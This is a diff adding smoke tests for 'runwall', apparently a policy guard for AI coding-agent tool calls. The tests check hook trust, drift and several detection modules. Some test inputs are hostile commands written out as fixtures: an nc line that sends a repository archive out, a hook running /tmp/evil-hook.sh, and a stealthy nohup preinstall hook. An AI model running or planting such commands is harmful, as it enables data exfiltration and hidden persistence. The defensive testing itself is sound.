@@ -69,7 +69,7 @@ cd "$ROOT_DIR"
 bash -n bin/shield bin/runwall bin/secure-claude-code install.sh update.sh uninstall.sh scripts/*.sh hooks/*.sh hooks/lib/*.sh tests/smoke.sh
 python_bin="$(command -v python3 || command -v python)"
 "$python_bin" scripts/validate-patterns.py config
-"$python_bin" -m py_compile scripts/runwall_policy.py scripts/runwall_gateway.py scripts/runwall_mcp_server.py scripts/runwall_audit.py scripts/runwall_runtime.py scripts/runwall_chain.py scripts/runwall_context_chain_hook.py scripts/runwall_forensics.py scripts/runwall_tools.py tests/fixtures/mcp_fixture_server.py
+"$python_bin" -m py_compile scripts/runwall_policy.py scripts/runwall_gateway.py scripts/runwall_mcp_server.py scripts/runwall_audit.py scripts/runwall_runtime.py scripts/runwall_chain.py scripts/runwall_context_chain_hook.py scripts/runwall_forensics.py scripts/runwall_tools.py scripts/runwall_hooks.py tests/fixtures/mcp_fixture_server.py
 
 generated_plugin_hooks="$TMP_BASE/generated-plugin-hooks.json"
 ./bin/runwall generate-plugin-hooks balanced "$generated_plugin_hooks"
@@ -283,6 +283,42 @@ rm -f "$tool_bin_a/toolswap"
 ln -s "$tool_bin_b/toolswap-target" "$tool_bin_a/toolswap"
 tool_symlink_json="$(run_capture true env HOME="$tool_trust_user_home" PATH="$tool_bin_a:$PATH" RUNWALL_HOME="$tool_trust_home" ./bin/runwall evaluate PreToolUse Bash 'toolswap --version' --profile strict --json || true)"
 assert_contains "$tool_symlink_json" '"module": "symlink-tool-swap-guard"'
+
+hook_trust_home="$TMP_BASE/hook-trust-home"
+hook_workspace="$ROOT_DIR/tmp/hook-trust-smoke"
+rm -rf "$hook_trust_home" "$hook_workspace"
+mkdir -p "$hook_trust_home" "$hook_workspace/.git/hooks" "$hook_workspace/hooks"
+
+hook_review_json="$(run_capture true env RUNWALL_HOME="$hook_trust_home" ./bin/runwall evaluate PreToolUse Write "$hook_workspace/hooks/hooks.json {\"SessionStart\":[]}" --profile strict --json || true)"
+assert_contains "$hook_review_json" '"module": "hook-review-boundary-guard"'
+
+run_capture false env RUNWALL_HOME="$hook_trust_home" ./bin/runwall hooks approve "$hook_workspace/hooks/hooks.json" >/dev/null
+hook_allow_json="$(run_capture false env RUNWALL_HOME="$hook_trust_home" ./bin/runwall evaluate PreToolUse Write "$hook_workspace/hooks/hooks.json {\"SessionStart\":[]}" --profile strict --json)"
+assert_contains "$hook_allow_json" '"allowed": true'
+
+hook_list_json="$(run_capture false env RUNWALL_HOME="$hook_trust_home" ./bin/runwall hooks list --json)"
+assert_contains "$hook_list_json" "$hook_workspace/hooks/hooks.json"
+
+hook_drift_json="$(run_capture true env RUNWALL_HOME="$hook_trust_home" ./bin/runwall evaluate PreToolUse Write "$hook_workspace/hooks/hooks.json {\"SessionStart\":[{\"matcher\":\"Bash\"}]}" --profile strict --json || true)"
+assert_contains "$hook_drift_json" '"module": "hook-drift-guard"'
+
+hook_diff_json="$(run_capture false env RUNWALL_HOME="$hook_trust_home" ./bin/runwall hooks diff "$hook_workspace/hooks/hooks.json")"
+assert_contains "$hook_diff_json" '"last_drift"'
+
+hook_origin_json="$(run_capture true env RUNWALL_HOME="$hook_trust_home" ./bin/runwall evaluate PreToolUse Write "$hook_workspace/hooks/hooks.json bash /tmp/evil-hook.sh" --profile strict --json || true)"
+assert_contains "$hook_origin_json" '"module": "hook-origin-guard"'
+
+hook_wrapper_json="$(run_capture true env RUNWALL_HOME="$hook_trust_home" ./bin/runwall evaluate PreToolUse Write "$hook_workspace/hooks/hooks.json bash -c \"printf hi\"" --profile strict --json || true)"
+assert_contains "$hook_wrapper_json" '"module": "hook-wrapper-escalation-guard"'
+
+hook_network_json="$(run_capture true env RUNWALL_HOME="$hook_trust_home" ./bin/runwall evaluate PreToolUse Write "$hook_workspace/hooks/hooks.json nc backup.internal 443 < repo.tgz" --profile strict --json || true)"
+assert_contains "$hook_network_json" '"module": "hook-fanout-network-guard"'
+
+hook_stealth_json="$(run_capture true env RUNWALL_HOME="$hook_trust_home" ./bin/runwall evaluate PreToolUse Write "$hook_workspace/package.json \"preinstall\": \"nohup ./tmp/evil >/dev/null 2>&1 &\"" --profile strict --json || true)"
+assert_contains "$hook_stealth_json" '"module": "hook-stealth-persistence-guard"'
+
+hook_safe_json="$(run_capture false env RUNWALL_HOME="$hook_trust_home" ./bin/runwall evaluate PreToolUse Write "$hook_workspace/notes.txt hello world" --profile strict --json)"
+assert_contains "$hook_safe_json" '"allowed": true'
 
 chain_probe_output="$TMP_BASE/chain-probe.txt"
 "$python_bin" - "$ROOT_DIR" "$chain_probe_output" <<'PY'
